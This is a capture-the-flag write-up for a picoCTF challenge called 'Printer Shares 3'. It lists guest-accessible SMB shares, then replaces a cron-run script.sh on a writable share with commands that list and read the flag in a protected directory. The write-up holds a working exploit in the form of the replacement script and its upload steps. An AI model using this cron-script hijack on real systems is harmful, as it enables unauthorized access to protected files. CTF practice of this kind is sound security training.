# Printer Shares 3 — picoCTF 2026

Check that the port is open:

    nc -vz dolphin-cove.picoctf.net 63137

List SMB shares:

    smbclient -L //dolphin-cove.picoctf.net -p 63137 -N
        shares          Disk      Public Share With Guests
        secure-shares   Disk      Printer for internal usage only
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)

Inspect the public `shares` share:

    smbclient //dolphin-cove.picoctf.net/shares -p 63137 -N
    smb: \> ls
      script.sh                           N       73  Wed Feb  4 21:22:17 2026
      cron.log                            N      258  Sun Mar 15 16:20:01 2026

Download the files:

    smb: \> get script.sh
    smb: \> get cron.log
    smb: \> exit

Look at the script:

    cat script.sh_orig
    #!/bin/bash
    # this script runs every minute
    echo "Health Check: $(date)"

And the cron log:

    cat cron.log
    Health Check: Sun Mar 15 16:47:01 UTC 2026

The key insight:
- The script runs **every minute**
- It writes the output of `echo "$( ... )"` into `cron.log`
- Anything inside `$()` is executed by the shell
- So if you upload a modified `script.sh`, the cron job will run **your commands**
- The secure share likely exists on disk at `/challenge/secure-shares`
- Even though SMB denies access, the cron job (running as a privileged user) can read it

Create a modified `script.sh` to explore the filesystem and read the flag:

    cat script.sh
    #!/bin/bash
    # this script runs every minute
    echo "=== PWD ==="
    echo "$(pwd)"
    echo "=== LS CURRENT ==="
    echo "$(ls -la)"
    echo "=== SECURE-SHARES ==="
    echo "$(ls -la /challenge/secure-shares 2>/dev/null)"
    echo "=== SECURE-SHARES RECURSIVE ==="
    echo "$(ls -R /challenge/secure-shares 2>/dev/null)"
    echo "$(cat /challenge/secure-shares/flag.txt)"

Upload the modified script:

    smbclient //dolphin-cove.picoctf.net/shares -p 63137 -N
    smb: \> put script.sh
    smb: \> exit

Wait one minute for cron to run, then re-download `cron.log`:

    smbclient //dolphin-cove.picoctf.net/shares -p 63137 -N
    smb: \> get cron.log
    smb: \> exit

Inside `cron.log`, the flag appears.

This completes the challenge.
